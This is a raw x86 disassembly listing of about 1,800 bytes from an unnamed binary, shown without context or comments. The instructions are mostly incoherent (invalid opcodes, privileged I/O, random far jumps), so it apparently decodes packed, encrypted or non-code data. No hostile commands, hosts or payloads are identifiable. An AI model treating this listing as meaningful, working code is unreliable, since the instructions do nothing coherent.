  41ee3a:	dec    ebx
  41ee3b:	mov    BYTE PTR [eax-0x622b9cb1],ah
  41ee41:	fdiv   st(2),st
  41ee43:	pop    eax
  41ee44:	mov    dl,0x1
  41ee46:	jno    0x41ee30
  41ee48:	dec    eax
  41ee49:	sbb    DWORD PTR [ebx-0x5170d03f],0xa
  41ee50:	test   eax,0x88c17715
  41ee55:	jle    0x41ee92
  41ee57:	push   ds
  41ee58:	mov    al,ds:0xf6869925
  41ee5d:	retf   0xe66c
  41ee60:	or     bh,BYTE PTR [edi-0x28e4212e]
  41ee66:	popa   
  41ee67:	test   eax,0x9813c405
  41ee6c:	inc    ebp
  41ee6d:	scas   eax,DWORD PTR es:[edi]
  41ee6e:	(bad)  
  41ee6f:	sbb    dl,BYTE PTR [esi+0x12199c2]
  41ee75:	mov    dl,0x1
  41ee77:	adc    BYTE PTR fs:[edx+ebp*2+0x67],cl
  41ee7c:	jmp    0x94902ac0
  41ee81:	mov    ds:0x94191321,al
  41ee86:	or     eax,0x8858a187
  41ee8b:	lea    esi,[eax+0x64]
  41ee8e:	sbb    al,0x2e
  41ee90:	jge    0x41ee2d
  41ee92:	call   0x14a88bc
  41ee97:	fcom   QWORD PTR [edx+ebp*1+0x49]
  41ee9b:	add    BYTE PTR [edi-0x40],ah
  41ee9e:	push   0x39fc6bb5
  41eea3:	mov    WORD PTR [edi-0x2a],fs
  41eea6:	or     DWORD PTR [eax-0x2e],edx
  41eea9:	add    BYTE PTR [ecx+0x24],0xe7
  41eead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeae:	cmp    al,0x28
  41eeb0:	cmp    al,0xec
  41eeb2:	mov    ecx,0xacf18b0c
  41eeb7:	rcr    BYTE PTR [ebx+0x18c8561b],cl
  41eebd:	ins    DWORD PTR es:[edi],dx
  41eebe:	mov    esp,0xdf3d8e4
  41eec3:	stos   BYTE PTR es:[edi],al
  41eec4:	je     0x41ef1a
  41eec6:	gs pusha 
  41eec8:	cmp    eax,0x17264453
  41eecd:	sbb    DWORD PTR [eax],0x423c8246
  41eed3:	xor    al,0x40
  41eed5:	push   esp
  41eed6:	cmp    eax,ebp
  41eed8:	and    al,0x84
  41eeda:	loop   0x41ef2e
  41eedc:	sbb    al,0xaa
  41eede:	leave  
  41eedf:	aam    0x21
  41eee1:	mov    eax,ds:0x79b8afcc
  41eee6:	jbe    0x41ee77
  41eee8:	sbb    cl,BYTE PTR [edx-0x53c51c4b]
  41eeee:	lahf   
  41eeef:	add    cl,BYTE PTR [edi+0x3110121c]
  41eef5:	dec    ebx
  41eef6:	fst    DWORD PTR [edi-0x50dadb9e]
  41eefc:	clc    
  41eefd:	das    
  41eefe:	sbb    al,ah
  41ef00:	inc    ecx
  41ef01:	repnz dec esp
  41ef03:	sbb    al,0x65
  41ef05:	xchg   esi,eax
  41ef06:	inc    ecx
  41ef07:	leave  
  41ef08:	ret    
  41ef09:	push   edx
  41ef0a:	das    
  41ef0b:	jecxz  0x41eeb5
  41ef0d:	pushf  
  41ef0e:	xor    eax,0xce747a6e
  41ef13:	xor    eax,0x9923f972
  41ef18:	sbb    WORD PTR [ebx+0xb],ax
  41ef1c:	in     al,dx
  41ef1d:	dec    esp
  41ef1e:	add    ah,dh
  41ef20:	push   ss
  41ef21:	xchg   esi,eax
  41ef22:	jecxz  0x41eec9
  41ef24:	xor    dl,BYTE PTR [ebp+0x7c]
  41ef27:	aaa    
  41ef28:	sbb    DWORD PTR [ebp-0x6c3d87f],edx
  41ef2e:	add    DWORD PTR [ebp-0x159c222e],ecx
  41ef34:	cmp    ah,BYTE PTR [esi]
  41ef36:	or     eax,0x5bb12821
  41ef3b:	sub    eax,0x5bf2496c
  41ef40:	mov    ebp,0x5d6f55ed
  41ef45:	xor    al,0x69
  41ef47:	add    al,0x60
  41ef49:	les    eax,FWORD PTR [esi]
  41ef4b:	ds mov ch,0x4f
  41ef4e:	rcr    BYTE PTR [ebx-0x21],1
  41ef51:	push   esi
  41ef52:	loop   0x41ef05
  41ef54:	and    al,0x5d
  41ef56:	sahf   
  41ef57:	cs push esi
  41ef59:	cld    
  41ef5a:	xor    al,0xf5
  41ef5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef5d:	mov    edx,0xb767a5af
  41ef62:	xchg   edi,edx
  41ef64:	jnp    0x41efcd
  41ef66:	jge    0x41eeea
  41ef68:	(bad)  
  41ef69:	jmp    0x297015ef
  41ef6e:	or     al,0xc1
  41ef70:	fsub   st(4),st
  41ef72:	jmp    0xa8a7c3f7
  41ef77:	dec    eax
  41ef78:	fdivp  st(7),st
  41ef7a:	in     eax,0x2a
  41ef7c:	mov    cl,0x69
  41ef7e:	sbb    al,0x7e
  41ef80:	jmp    0xd1f813a6
  41ef85:	cmp    edx,DWORD PTR [edi]
  41ef87:	and    ah,BYTE PTR [edi+0x1e]
  41ef8a:	je     0x41efaf
  41ef8c:	out    0xf4,eax
  41ef8e:	sub    eax,0x8e64fc24
  41ef93:	scas   al,BYTE PTR es:[edi]
  41ef94:	cdq    
  41ef95:	mov    edi,0xec5b6b27
  41ef9a:	sbb    ebp,edi
  41ef9c:	or     al,0x93
  41ef9e:	inc    eax
  41ef9f:	ins    DWORD PTR es:[edi],dx
  41efa0:	cmp    DWORD PTR [esi+0x2b455c1b],esi
  41efa6:	mov    WORD PTR [ebx],?
  41efa8:	ror    DWORD PTR [ebp+0x46],1
  41efab:	mov    ebp,0x4ed98f31
  41efb0:	ret    0xeaf4
  41efb3:	jecxz  0x41f032
  41efb5:	add    al,0x17
  41efb7:	test   DWORD PTR [ebp+0x2aac6a34],ebp
  41efbd:	(bad)  [ebp-0x27]
  41efc0:	shl    DWORD PTR [ebp-0xd],cl
  41efc3:	jmp    0x41eff3
  41efc5:	(bad)  
  41efc6:	repnz enter 0x5035,0x4c
  41efcb:	xchg   WORD PTR [ebp+0x26],sp
  41efcf:	popf   
  41efd0:	aad    0x6a
  41efd2:	cwde   
  41efd3:	in     eax,0x18
  41efd5:	hlt    
  41efd6:	push   ebp
  41efd7:	add    ebx,DWORD PTR [ebx-0x53]
  41efda:	mov    esp,0xf503f4a
  41efdf:	les    esi,FWORD PTR [edx-0x73f40d26]
  41efe5:	xor    edx,DWORD PTR [ebx-0x39]
  41efe8:	pop    ecx
  41efe9:	in     al,dx
  41efea:	dec    ebx
  41efeb:	test   al,0x4a
  41efed:	(bad)  
  41efee:	int3   
  41efef:	test   eax,0x98ef6907
  41eff4:	(bad)  
  41eff7:	icebp  
  41eff8:	(bad)  
  41effa:	call   ebp
  41effc:	mov    ds:0xc578fb5d,eax
  41f001:	cmp    BYTE PTR [ebx-0x7e90674d],bh
  41f007:	inc    ebx
  41f008:	ss out dx,eax
  41f00a:	rcl    ah,0x4c
  41f00d:	and    eax,0xbcfde4ff
  41f012:	push   eax
  41f013:	xchg   ecx,eax
  41f014:	and    BYTE PTR [esp+edi*2-0x50],bh
  41f018:	ret    
  41f019:	lahf   
  41f01a:	mov    DWORD PTR [ebx-0x4f9c67b3],eax
  41f020:	data16 xchg cl,al
  41f023:	cld    
  41f024:	call   0x5f30711c
  41f029:	add    bh,BYTE PTR [eax]
  41f02b:	enter  0xd17e,0x4a
  41f02f:	(bad)  [edi+0x5db5da86]
  41f035:	pop    es
  41f036:	sub    al,0xdc
  41f038:	jns    0x41f052
  41f03a:	mov    ebp,0xfac9fc0f
  41f03f:	cmp    DWORD PTR [ebx],edx
  41f041:	dec    edi
  41f042:	pop    ebx
  41f043:	(bad)  [esi+0x31d5bb5d]
  41f049:	ins    DWORD PTR es:[edi],dx
  41f04a:	out    0x9c,al
  41f04c:	sub    al,0xd9
  41f04e:	dec    ebx
  41f04f:	mov    eax,ds:0x9d533668
  41f054:	cld    
  41f055:	gs and al,0xe8
  41f058:	int3   
  41f059:	jmp    0x41f08f
  41f05b:	dec    ebx
  41f05c:	lock pop edi
  41f05e:	icebp  
  41f05f:	or     bl,dl
  41f061:	jmp    0xbd9:0x99c277b5
  41f068:	mov    ebp,0xbfc621ec
  41f06d:	cwde   
  41f06e:	lahf   
  41f06f:	jne    0x41f07f
  41f071:	es adc eax,edi
  41f074:	add    DWORD PTR [esi],edx
  41f076:	sar    DWORD PTR [ebx-0x44451043],1
  41f07c:	pop    ebx
  41f07d:	inc    ebx
  41f07e:	test   al,0x4f
  41f080:	popa   
  41f081:	int3   
  41f082:	leave  
  41f083:	mov    ds:0x207e15a5,al
  41f088:	mov    esp,0x859ce56f
  41f08d:	sub    BYTE PTR [edi],dl
  41f08f:	inc    edx
  41f090:	mov    edi,0xc4a08bec
  41f095:	sbb    DWORD PTR [eax],0xf8027c54
  41f09b:	call   FWORD PTR ds:0x65c94552
  41f0a1:	sub    al,0xd0
  41f0a3:	inc    edi
  41f0a4:	inc    edx
  41f0a5:	fnsave [edi+0x43]
  41f0a8:	sbb    al,BYTE PTR [ebx+edi*4+0x7a]
  41f0ac:	in     al,dx
  41f0ad:	and    eax,0x2e71250e
  41f0b2:	xor    ebx,ebx
  41f0b4:	popf   
  41f0b5:	xlat   BYTE PTR ds:[ebx]
  41f0b6:	add    al,0xb6
  41f0b8:	xchg   edi,eax
  41f0b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ba:	ja     0x41f048
  41f0bc:	inc    ebx
  41f0bd:	rcr    DWORD PTR [ecx],1
  41f0bf:	push   edi
  41f0c0:	xchg   edi,eax
  41f0c1:	test   BYTE PTR [eax+0x14ca213],bh
  41f0c7:	fst    st(5)
  41f0c9:	scas   eax,DWORD PTR es:[edi]
  41f0ca:	jg     0x41f0d6
  41f0cc:	ja     0x41f10c
  41f0ce:	cmp    ebx,esi
  41f0d0:	mov    edi,DWORD PTR [edi]
  41f0d2:	lock adc DWORD PTR [ecx+0x64],edi
  41f0d6:	retf   
  41f0d7:	test   al,0x29
  41f0d9:	cmp    BYTE PTR [eax+0x1],dh
  41f0dc:	in     al,dx
  41f0dd:	lods   al,BYTE PTR ds:[esi]
  41f0de:	test   BYTE PTR [esp+edi*2+0x1c],bl
  41f0e2:	cmp    al,0x5
  41f0e4:	sbb    BYTE PTR [edx],ah
  41f0e6:	pop    ds
  41f0e7:	popa   
  41f0e8:	pop    esp
  41f0e9:	sub    bh,BYTE PTR [ebx]
  41f0eb:	xchg   edi,eax
  41f0ec:	std    
  41f0ed:	fs pop edi
  41f0ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0f0:	mov    cl,0xfd
  41f0f2:	mov    eax,ds:0x10100462
  41f0f7:	test   DWORD PTR [ebp+0x2b718b5a],ebp
  41f0fd:	shr    BYTE PTR [edi],1
  41f0ff:	dec    edx
  41f100:	mov    ds:0x20c67d5f,al
  41f105:	lock mov bh,0xb4
  41f108:	mov    ebp,0xbc439680
  41f10d:	sti    
  41f10e:	fldcw  WORD PTR [edx]
  41f110:	call   0x718c:0xde1fff34
  41f117:	(bad)  
  41f118:	jbe    0x41f0a4
  41f11a:	mov    dh,BYTE PTR [ebp-0x489790f6]
  41f120:	fs jg  0x41f151
  41f123:	sub    bh,BYTE PTR [bp+si-0x2b]
  41f127:	call   ebp
  41f129:	jge    0x41f0dd
  41f12b:	into   
  41f12c:	jp     0x41f0e7
  41f12e:	sub    al,0x27
  41f130:	xchg   ebx,eax
  41f131:	and    eax,0xee787e37
  41f136:	adc    eax,0x337ec955
  41f13b:	xchg   DWORD PTR [edx+esi*4+0xc],ecx
  41f13f:	or     edx,DWORD PTR [ecx+0x314f4617]
  41f145:	mov    ebx,0xd399e88c
  41f14a:	lods   al,BYTE PTR ds:[esi]
  41f14b:	mov    WORD PTR [edi+edi*4],?
  41f14e:	or     eax,DWORD PTR [ecx-0x7d]
  41f151:	out    dx,eax
  41f152:	daa    
  41f153:	jmp    DWORD PTR [edx-0x5]
  41f156:	pop    es
  41f157:	dec    edx
  41f158:	dec    ebx
  41f159:	int3   
  41f15a:	push   ds
  41f15b:	adc    dh,ch
  41f15d:	mov    esp,0xf2afc3f6
  41f162:	adc    bh,BYTE PTR [ebp-0x63]
  41f165:	add    edi,DWORD PTR [ebp+0x21]
  41f168:	cmp    dl,BYTE PTR [edi]
  41f16a:	and    ah,BYTE PTR [ebp-0x78e949a3]
  41f170:	rcr    DWORD PTR [esi-0x1abde808],cl
  41f176:	and    esp,eax
  41f178:	xchg   edi,eax
  41f179:	clc    
  41f17a:	push   0x34
  41f17c:	sahf   
  41f17d:	adc    DWORD PTR [ecx-0x70],esp
  41f180:	addr16 mov eax,ds:0xa939
  41f184:	stc    
  41f185:	lods   al,BYTE PTR ds:[esi]
  41f186:	mov    ss,WORD PTR [ecx]
  41f188:	in     eax,0x5e
  41f18a:	mov    ch,0x51
  41f18c:	bound  edi,QWORD PTR [eax-0x3]
  41f18f:	adc    esi,DWORD PTR [edi+0x23]
  41f192:	cmp    ecx,esi
  41f194:	lahf   
  41f195:	add    DWORD PTR [ebp-0x1636338d],eax
  41f19b:	cdq    
  41f19c:	es ds mov cl,0x56
  41f1a0:	jbe    0x41f15d
  41f1a2:	mov    esi,0x6e65dfe9
  41f1a7:	lea    ebp,[ecx-0x825f739]
  41f1ad:	dec    ecx
  41f1ae:	cmp    DWORD PTR [ebp-0x49],eax
  41f1b1:	cmp    ebx,edi
  41f1b3:	pusha  
  41f1b4:	shl    BYTE PTR [ecx],cl
  41f1b6:	gs cmp al,0xe7
  41f1b9:	das    
  41f1ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1bb:	jp     0x41f20d
  41f1bd:	xor    ecx,edx
  41f1bf:	adc    edi,DWORD PTR [ecx]
  41f1c1:	adc    edi,DWORD PTR [esi]
  41f1c3:	arpl   WORD PTR [edi+0x38b33ef8],sp
  41f1c9:	mov    BYTE PTR ds:0x6bfdf94,dh
  41f1cf:	add    al,BYTE PTR [edx+0x4f]
  41f1d2:	mov    esi,DWORD PTR cs:[ebp+eiz*4+0x7b]
  41f1d7:	xchg   ebx,eax
  41f1d8:	xchg   esi,eax
  41f1d9:	jmp    FWORD PTR [edx-0x630c4837]
  41f1df:	fidivr WORD PTR [ebp+0x42]
  41f1e2:	adc    DWORD PTR ds:[ebp+ebx*4-0x1ee1d20d],ebx
  41f1ea:	pop    eax
  41f1eb:	mov    fs,WORD PTR [esi+eax*2-0x62cd60d]
  41f1f2:	and    BYTE PTR [edi],0x17
  41f1f5:	xchg   ecx,eax
  41f1f6:	cmp    DWORD PTR [edi],ecx
  41f1f8:	pop    esi
  41f1f9:	mov    WORD PTR [esi+0x4225297c],?
  41f1ff:	mul    DWORD PTR [ebx+0x3e65921e]
  41f205:	cld    
  41f206:	sub    eax,0xa6a3dc72
  41f20b:	dec    eax
  41f20c:	sahf   
  41f20d:	and    DWORD PTR [ebp-0x15],edx
  41f210:	push   edx
  41f211:	adc    esi,DWORD PTR [eax-0x7a]
  41f214:	outs   dx,DWORD PTR ds:[esi]
  41f215:	imul   edi,ecx,0x58
  41f218:	adc    eax,0xabcd5ee2
  41f21d:	mov    dh,cl
  41f21f:	popa   
  41f220:	push   cs
  41f221:	push   esi
  41f222:	mov    DWORD PTR [eax+0x22f8a5c],esi
  41f228:	push   ss
  41f229:	sbb    eax,0x963b4e34
  41f22e:	jbe    0x41f22b
  41f230:	pmulhw mm3,QWORD PTR [esi-0x22499785]
  41f237:	std    
  41f238:	xchg   esi,eax
  41f239:	sub    eax,0x5f5f5a28
  41f23e:	mov    bh,0x8f
  41f240:	nop
  41f241:	clc    
  41f242:	int    0x4b
  41f244:	icebp  
  41f245:	xchg   ecx,eax
  41f246:	pusha  
  41f247:	sbb    ch,BYTE PTR [ebx+0x38]
  41f24a:	sti    
  41f24b:	dec    eax
  41f24c:	dec    edi
  41f24d:	aaa    
  41f24e:	lock jp 0x41f244
  41f251:	dec    ebx
  41f252:	into   
  41f253:	push   edx
  41f254:	fs pusha 
  41f256:	call   0xaf6e7be7
  41f25b:	mov    bl,BYTE PTR [ecx]
  41f25d:	pusha  
  41f25e:	loope  0x41f222
  41f260:	into   
  41f261:	in     eax,0x62
  41f263:	sbb    al,0x6b
  41f265:	lock nop
  41f267:	scas   eax,DWORD PTR es:[edi]
  41f268:	pop    ds
  41f269:	and    eax,0x3a96377d
  41f26e:	xchg   DWORD PTR [edi+0xc],ebp
  41f271:	xchg   edx,eax
  41f272:	dec    eax
  41f273:	jmp    0x41f241
  41f275:	add    eax,0xb3e00409
  41f27a:	mov    edx,0x191d23de
  41f27f:	fmulp  st(2),st
  41f281:	push   esp
  41f282:	cdq    
  41f283:	repz loopne 0x41f2d9
  41f286:	jmp    0xa6bc:0x137fe29a
  41f28d:	std    
  41f28e:	sub    DWORD PTR [edx],esp
  41f290:	cld    
  41f291:	inc    esi
  41f292:	sbb    ecx,DWORD PTR ds:0x9eb40f62
  41f298:	leave  
  41f299:	nop
  41f29a:	inc    edi
  41f29b:	ins    BYTE PTR es:[edi],dx
  41f29c:	jmp    0x167dc356
  41f2a1:	fdiv   DWORD PTR [eax-0x25]
  41f2a4:	push   esp
  41f2a5:	xor    al,0x85
  41f2a7:	mov    bl,0xb6
  41f2a9:	sub    ch,cl
  41f2ab:	add    al,0x8
  41f2ad:	loope  0x41f299
  41f2af:	dec    esi
  41f2b0:	mov    al,ds:0x2f05557e
  41f2b5:	pop    esp
  41f2b6:	jl     0x41f2b6
  41f2b8:	cdq    
  41f2b9:	and    ch,BYTE PTR [ecx+0x2e09979e]
  41f2bf:	or     ah,al
  41f2c1:	clc    
  41f2c2:	cld    
  41f2c3:	loop   0x41f2b6
  41f2c5:	jmp    0x41f31c
  41f2c7:	inc    esp
  41f2c8:	mul    BYTE PTR [ebp+0x7088030d]
  41f2ce:	cld    
  41f2cf:	or     al,0x91
  41f2d1:	mov    dh,0x3d
  41f2d3:	adc    ebx,DWORD PTR [edi]
  41f2d5:	pop    ss
  41f2d6:	push   0xc85360a6
  41f2db:	int3   
  41f2dc:	push   ebx
  41f2dd:	mov    edi,0x38ef1b92
  41f2e2:	jmp    0xb118:0xe4c366e6
  41f2e9:	mov    bl,0x9f
  41f2eb:	jns    0x41f2a4
  41f2ed:	and    eax,0x9cad7082
  41f2f2:	leave  
  41f2f3:	cmp    BYTE PTR [edi-0x601ddca2],dh
  41f2f9:	ja     0x41f2df
  41f2fb:	rol    ch,0x62
  41f2fe:	jecxz  0x41f2db
  41f300:	leavew 
  41f302:	xchg   ecx,edx
  41f304:	popf   
  41f305:	(bad)
  41f309:	into   
  41f30a:	enter  0x7078,0x53
  41f30e:	out    dx,al
  41f30f:	push   ss
  41f310:	jp     0x41f38f
  41f312:	lds    ebx,FWORD PTR [ebx+0x69]
  41f315:	sbb    al,0xef
  41f317:	int3   
  41f318:	daa    
  41f319:	ret    0x7f8
  41f31c:	pop    esi
  41f31d:	cmp    dl,dh
  41f31f:	and    al,0x5c
  41f321:	sbb    eax,0xf438784a
  41f326:	pusha  
  41f327:	and    eax,0x71a5123e
  41f32c:	jle    0x41f358
  41f32e:	cld    
  41f32f:	in     al,dx
  41f330:	jmp    0xd29d:0xda09b726
  41f337:	data16 and al,0x5f
  41f33a:	and    BYTE PTR ds:0xc81c4f21,bl
  41f340:	jbe    0x41f358
  41f342:	xor    BYTE PTR [esi],cl
  41f344:	in     eax,dx
  41f345:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f347:	cmp    al,0x27
  41f349:	loopne 0x41f36a
  41f34b:	xchg   esp,eax
  41f34c:	push   esi
  41f34d:	shl    BYTE PTR [eax+0x1ca32807],cl
  41f353:	(bad)  
  41f354:	xlat   BYTE PTR ds:[ebx]
  41f355:	mov    dl,0x6
  41f357:	or     DWORD PTR [edx+0x5a],eax
  41f35a:	xchg   BYTE PTR [esi-0x108ba2a5],bh
  41f360:	jmp    0x41f39d
  41f362:	(bad)  
  41f363:	push   ds
  41f364:	push   ebp
  41f365:	cs pop edx
  41f367:	xor    BYTE PTR [esi+0xa0fd0d9],dl
  41f36d:	sar    BYTE PTR [edi],1
  41f36f:	push   esi
  41f370:	pop    esp
  41f371:	aam    0xec
  41f373:	push   0xc2f8bc94
  41f378:	cdq    
  41f379:	or     edx,DWORD PTR [esp+eax*1-0x2b23c19]
  41f380:	(bad)  
  41f381:	retf   
  41f382:	loop   0x41f34f
  41f384:	sub    eax,0x69d95873
  41f389:	sub    edx,edi
  41f38b:	lods   eax,DWORD PTR ds:[esi]
  41f38c:	dec    edi
  41f38d:	mov    BYTE PTR [esi+0x6be1efc7],bh
  41f393:	ins    BYTE PTR es:[edi],dx
  41f394:	and    BYTE PTR [edx-0x3c],0xbd
  41f398:	lods   eax,DWORD PTR ds:[esi]
  41f399:	inc    esi
  41f39a:	mov    dh,al
  41f39c:	shl    esi,1
  41f39e:	pop    es
  41f39f:	aad    0x28
  41f3a1:	in     eax,dx
  41f3a2:	loope  0x41f364
  41f3a4:	sub    al,0x5b
  41f3a6:	push   edi
  41f3a7:	xchg   esp,eax
  41f3a8:	sar    al,cl
  41f3aa:	std    
  41f3ab:	pop    esp
  41f3ac:	imul   esp,ebp,0x82a9dca6
  41f3b2:	mov    eax,0xfb5d6f72
  41f3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b8:	pop    ds
  41f3b9:	and    eax,0xc2122db5
  41f3be:	xchg   esp,eax
  41f3bf:	fisubr DWORD PTR [edx]
  41f3c1:	in     al,dx
  41f3c2:	fisttp DWORD PTR [esi-0x44]
  41f3c5:	mov    bl,dh
  41f3c7:	stc    
  41f3c8:	sub    ecx,0xdab83d6
  41f3ce:	pop    esi
  41f3cf:	ret    0x451
  41f3d2:	xor    eax,ebx
  41f3d4:	push   ecx
  41f3d5:	inc    esp
  41f3d6:	aad    0x92
  41f3d8:	pop    esp
  41f3d9:	push   ds
  41f3da:	lock out 0x5e,al
  41f3dd:	mov    DWORD PTR [edx],edx
  41f3df:	stc    
  41f3e0:	cmp    edx,DWORD PTR [edi+0x6d]
  41f3e3:	mov    es,WORD PTR [edx-0x676fb568]
  41f3e9:	dec    ecx
  41f3ea:	mov    bh,0x14
  41f3ec:	pop    eax
  41f3ed:	stc    
  41f3ee:	out    dx,eax
  41f3ef:	sbb    BYTE PTR [ebx+0x3e846292],cl
  41f3f5:	mov    cl,0xe9
  41f3f7:	lock adc DWORD PTR [ecx+0x7e],edx
  41f3fb:	ins    DWORD PTR es:[edi],dx
  41f3fc:	aad    0x48
  41f3fe:	jnp    0x41f393
  41f400:	pop    eax
  41f401:	jo     0x41f44c
  41f403:	fs js  0x41f411
  41f406:	sub    DWORD PTR [ebx-0x7fd77de1],esi
  41f40c:	pop    ebx
  41f40d:	jne    0x41f3b8
  41f40f:	int3   
  41f410:	sahf   
  41f411:	test   eax,0x490d6a9a
  41f416:	inc    ebx
  41f417:	retf   0x4f89
  41f41a:	(bad)  
  41f41b:	retf   
  41f41c:	stc    
  41f41d:	sbb    DWORD PTR [ecx-0x14],ebp
  41f420:	mov    ds:0x5828356,eax
  41f425:	mov    ch,0x6f
  41f427:	or     DWORD PTR [esp+edi*8-0x1],edx
  41f42b:	pushf  
  41f42c:	sub    eax,0x5964095d
  41f431:	out    dx,al
  41f432:	fdivr  st,st(2)
  41f434:	dec    ecx
  41f435:	sub    al,0xba
  41f437:	retf   0x97c2
  41f43a:	les    ecx,FWORD PTR [ecx]
  41f43c:	and    al,0x25
  41f43e:	dec    ecx
  41f43f:	mov    ebx,0xdc568048
  41f444:	sub    ah,dh
  41f446:	mov    esp,0xb067a156
  41f44b:	push   eax
  41f44c:	in     eax,dx
  41f44d:	fdiv   DWORD PTR [esi]
  41f44f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f450:	sbb    al,ch
  41f452:	fs push ss
  41f454:	inc    eax
  41f455:	xchg   edi,eax
  41f456:	sti    
  41f457:	retf   
  41f458:	add    bh,BYTE PTR [ecx+0x5d4cab82]
  41f45e:	add    eax,0x5b2c56aa
  41f463:	leave  
  41f464:	les    edi,FWORD PTR [ecx+0xa8948f6]
  41f46a:	mov    cl,0xd
  41f46c:	jmp    0x41f422
  41f46e:	lods   al,BYTE PTR ds:[esi]
  41f46f:	test   BYTE PTR [ecx+0x338acce1],0x56
  41f476:	adc    al,0x21
  41f478:	sub    DWORD PTR [ebp+0x2e],ecx
  41f47b:	jmp    0x9552dc44
  41f480:	push   cs
  41f481:	inc    ebx
  41f482:	inc    ebx
  41f483:	pop    es
  41f484:	push   edx
  41f485:	mov    esp,0xecd19ab8
  41f48a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f48b:	inc    ebp
  41f48c:	jmp    0x4de56973
  41f491:	addr16 ds mov ebx,0xba7518ca
  41f498:	enter  0x8b5e,0xcb
  41f49c:	sbb    esp,ebx
  41f49e:	stc    
  41f49f:	xchg   edx,eax
  41f4a0:	xor    DWORD PTR [edx-0x16],ebx
  41f4a3:	pushf  
  41f4a4:	or     BYTE PTR [esi+0x360b656d],cl
  41f4aa:	jmp    0xcfae:0xf19fb639
  41f4b1:	jg     0x41f52e
  41f4b3:	pop    ds
  41f4b4:	nop
  41f4b5:	xor    edi,esi
  41f4b7:	das    
  41f4b8:	lds    ebp,FWORD PTR ds:0xe0ee3cf
  41f4be:	call   FWORD PTR [edi+0x53]
  41f4c1:	fcomp  QWORD PTR [edi]
  41f4c3:	jo     0x41f477
  41f4c5:	call   0xb5cb:0x820b219a
  41f4cc:	xor    DWORD PTR [esi+eax*1],edi
  41f4cf:	cld    
  41f4d0:	nop
  41f4d1:	std    
  41f4d2:	gs pop ebx
  41f4d4:	xchg   DWORD PTR [edx],ebx
  41f4d6:	or     al,0x20
  41f4d8:	sub    edi,DWORD PTR [ebx+ecx*4-0x7]
  41f4dc:	stos   BYTE PTR es:[edi],al
  41f4dd:	push   ebx
  41f4de:	mov    eax,0x2d1970ca
  41f4e3:	xchg   ebx,eax
  41f4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4e5:	jg     0x41f467
  41f4e7:	std    
  41f4e8:	in     al,dx
  41f4e9:	ins    DWORD PTR es:[edi],dx
  41f4ea:	pop    edx
  41f4eb:	les    eax,FWORD PTR [ecx+0x60]
  41f4ee:	nop
  41f4ef:	inc    eax
  41f4f0:	xchg   ecx,eax
  41f4f1:	adc    BYTE PTR [esi-0x42],ch
  41f4f4:	stos   DWORD PTR es:[edi],eax
  41f4f5:	add    ecx,esp
  41f4f7:	add    DWORD PTR [ecx],ecx
  41f4f9:	aaa    
  41f4fa:	lods   al,BYTE PTR ds:[esi]
  41f4fb:	iret   
  41f4fc:	or     ebx,DWORD PTR [ecx+edx*2-0x63]
  41f500:	fidivr WORD PTR ds:0x2462153
  41f506:	cli    
  41f507:	imul   ebp,DWORD PTR [edx-0x41340ed1],0x60
  41f50e:	ja     0x41f4d1
  41f510:	stos   DWORD PTR es:[edi],eax
  41f511:	call   0x61d69428
  41f516:	xchg   BYTE PTR [eax-0x5fcfc1a5],dh
  41f51c:	mov    ch,0x53
  41f51e:	mov    bh,ch
  41f520:	mov    al,ds:0xcb2a41ce
  41f525:	xchg   DWORD PTR [esi-0x25dd3324],ebp
  41f52b:	nop
  41f52c:	je     0x41f4d5
  41f52e:	push   esp
  41f52f:	retf   
  41f530:	ja     0x41f5a2
  41f532:	ret    
  41f533:	out    dx,al
  41f534:	cmp    ah,ah
  41f536:	gs xor al,0x7c
  41f539:	mov    BYTE PTR ds:0xb82a778f,cl
  41f53f:	shl    BYTE PTR ds:0x69327efa,0x9b
  41f546:	in     al,dx
  41f547:	xchg   edi,eax
  41f548:	lods   al,BYTE PTR ds:[esi]
  41f549:	daa    
  41f54a:	mov    edx,0xc2e7dc03
  41f54f:	in     eax,0xc9
  41f551:	jge    0x41f4ec
  41f553:	push   esi
  41f554:	xor    edi,ebp
  41f556:	pop    esi
  41f557:	cmp    eax,0xb9160314
  41f55c:	loopne 0x41f5a0
  41f55e:	mov    ds:0x94ede87d,al
  41f563:	or     al,0x80
  41f566:	enter  0x7163,0xfb
  41f56a:	cli    
  41f56b:	ret    0xcdc0
  41f56e:	adc    eax,0xdcd511fc
  41f573:	test   bh,cl
  41f575:	cmp    eax,0x1c5ef5b9
  41f57a:	jg     0x41f584
  41f57c:	xor    BYTE PTR [esi],al
  41f57e:	ins    BYTE PTR es:[edi],dx
  41f57f:	cmp    al,0xb6
  41f581:	sub    al,0x5e
  41f583:	iret   
  41f584:	dec    eax
  41f585:	add    ebp,esi
  41f587:	mov    DWORD PTR [ebp+edi*2-0x784f431c],eax
  41f58e:	leave  
  41f58f:	mov    ds:0xe03a2265,al
  41f594:	push   edi
  41f595:	or     al,0x5c
  41f597:	nop
  41f598:	cmp    BYTE PTR [esi+0x3],0x37
  41f59c:	inc    ebx
  41f59d:	xor    eax,0x444dbae5
  41f5a2:	cs jge 0x41f52c
  41f5a5:	aas    
  41f5a6:	inc    esp
  41f5a7:	push   esi
  41f5a8:	in     al,0x32
  41f5aa:	out    0x82,eax
  41f5ac:	in     eax,0xc9
  41f5ae:	lahf   
  41f5af:	in     eax,0xc7
  41f5b1:	push   ds
  41f5b2:	jns    0x41f53a
  41f5b4:	jecxz  0x41f598
  41f5b6:	in     eax,0xf8
  41f5b8:	adc    ecx,DWORD PTR [eax]
  41f5ba:	rcr    bh,1
  41f5bc:	dec    edi
  41f5bd:	mov    eax,0x62ea5217
  41f5c2:	push   eax
  41f5c3:	mov    WORD PTR [esi+0x1f148e47],?
  41f5c9:	loope  0x41f64a
  41f5cb:	pop    esp
  41f5cc:	pop    esi
  41f5cd:	mov    bh,0x29
  41f5cf:	int3   
  41f5d0:	mov    ah,0x54
  41f5d2:	cmc    
  41f5d3:	(bad)  
